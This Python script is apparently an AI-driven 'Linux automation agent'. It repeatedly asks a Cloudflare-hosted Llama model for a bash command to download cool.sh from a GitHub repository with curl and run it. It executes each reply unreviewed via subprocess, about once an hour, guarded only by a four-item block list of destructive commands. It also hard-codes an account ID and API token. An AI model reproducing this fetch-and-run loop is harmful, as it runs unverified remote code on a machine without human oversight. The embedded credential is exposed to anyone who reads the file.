import requests
import subprocess
import time
import json

ACCOUNT_ID = "c5940c02e3dafe0fd1cd850d89202dfc"
API_TOKEN = "cfut_9nfwH1Hxu6yn3nwI6zk5ILfWuOELGi9CFUYzwqNa8b740353"

MODEL = "@cf/meta/llama-3.1-8b-instruct-fast"

URL = f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/ai/run/{MODEL}"

headers = {
    "Authorization": f"Bearer {API_TOKEN}",
    "Content-Type": "application/json"
}

SYSTEM = """
You are a Linux automation agent.

Rules:
- Return ONLY one bash command
- No explanation
- Keep commands short
"""

GOAL = """
download file use curl -O -L -J from https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/cool.sh
Start a bash script bash cool.sh
"""

BLOCK = [
    "rm -rf",
    "shutdown",
    "reboot",
    "mkfs"
]

history = []


def ask():
    payload = {
        "messages": [
            {
                "role": "system",
                "content": SYSTEM
            },
            {
                "role": "user",
                "content": (
                    f"Goal: {GOAL}\n\n"
                    f"Previous output:\n{history[-3:]}\n\n"
                    f"Next command:"
                )
            }
        ]
    }

    try:
        response = requests.post(
            URL,
            headers=headers,
            json=payload,
            timeout=120
        )

        print(f"\nHTTP {response.status_code}")

        try:
            result = response.json()
        except Exception:
            print("Invalid JSON response:")
            print(response.text)
            return None

        print(json.dumps(result, indent=2))

        if not result.get("success", False):
            print("API returned success=false")
            return None

        data = result.get("result")

        if data is None:
            print("No result field returned")
            return None

        if isinstance(data, dict):
            cmd = (
                data.get("response")
                or data.get("text")
                or data.get("output")
            )

            if cmd:
                return cmd.strip()

        print("Could not locate model response")
        return None

    except requests.exceptions.Timeout:
        print("Request timeout")
        return None

    except Exception as e:
        print("Request failed:", str(e))
        return None


while True:
    try:
        cmd = ask()

        if not cmd:
            print("No command received. Retrying in 60 seconds.")
            time.sleep(3600)
            continue

        print("\nAI command:", cmd)

        if any(x in cmd.lower() for x in BLOCK):
            print("Blocked dangerous command")
            time.sleep(3660)
            continue

        output = subprocess.getoutput(cmd)

        print("\nOutput:")
        print(output)

        history.append(f"$ {cmd}\n{output}")

        if len(history) > 50:
            history = history[-50:]

        time.sleep(3600)

    except KeyboardInterrupt:
        print("\nStopped by user.")
        break

    except Exception as e:
        print("Loop error:", str(e))
        time.sleep(3660)
